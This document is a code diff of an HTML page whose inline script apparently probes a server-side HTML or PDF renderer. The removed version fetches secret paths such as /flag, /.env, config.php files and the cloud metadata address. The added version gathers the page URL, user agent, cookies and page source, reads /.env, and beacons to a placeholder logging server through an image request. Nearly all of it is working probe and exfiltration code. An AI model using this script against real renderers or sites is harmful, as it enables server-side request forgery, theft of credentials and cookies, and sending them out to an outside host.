@@ -1,53 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Server-Side JS Info Extractor</title>
+  <title>Where Am I?</title>
   <style>
-    body { font-family: monospace; white-space: pre-wrap; }
+    body { font-family: monospace; white-space: pre-wrap; padding: 2em; background: #111; color: #0f0; }
   </style>
 </head>
 <body>
-  <h1>PDF JS Info Extractor</h1>
+  <h1>🔍 Environment Leak Test</h1>
   <div id="output">Loading...</div>
+
   <script>
-    const output = document.getElementById('output');
-    const paths = [
-      '/flag',
-      '/admin/secret',
-      '/.env',
-      '/config',
-      '/config.php',
-      '/config/config.php',
-      '/settings.php',
-      '/includes/config.php',
-      '/config/.env',
-      '/env',
-      '/app/config.php',
-      '/admin/config.php',
-      'http://169.254.169.254/latest/meta-data/'
-    ];
-
     (async () => {
-      let results = `URL: ${window.location.href}\n`;
-      results += `User Agent: ${navigator.userAgent}\n\n`;
+      const output = document.getElementById('output');
+      let result = "";
 
-      for (const path of paths) {
-        results += `==== Trying: ${path} ====\n`;
-        try {
-          const res = await fetch(path);
-          if (res.ok) {
-            const text = await res.text();
-            results += text.slice(0, 1000) + '\n\n';
-          } else {
-            results += `Status: ${res.status}\n\n`;
-          }
-        } catch (e) {
-          results += `Error: ${e.message}\n\n`;
-        }
+      // Current URL
+      result += "📍 Location: " + window.location.href + "\n\n";
+
+      // User Agent
+      result += "🧠 User Agent: " + navigator.userAgent + "\n\n";
+
+      // Document cookies
+      result += "🍪 Cookies: " + document.cookie + "\n\n";
+
+      // HTML snippet
+      result += "📄 HTML Snippet:\n" + document.documentElement.outerHTML.slice(0, 1000) + "\n\n";
+
+      // Attempt fetch to internal file (example)
+      try {
+        const res = await fetch('/.env');
+        const text = await res.text();
+        result += `📁 /.env response (${res.status}):\n` + text.slice(0, 500) + "\n\n";
+      } catch (err) {
+        result += "❌ Error fetching /.env: " + err.message + "\n\n";
       }
 
-      output.textContent = results;
+      // Remote ping (change to your server!)
+      const pingUrl = "https://your-logging-server.example.com/ping?ua=" + encodeURIComponent(navigator.userAgent);
+      const img = new Image();
+      img.src = pingUrl;
+
+      output.textContent = result;
     })();
   </script>
 </body>
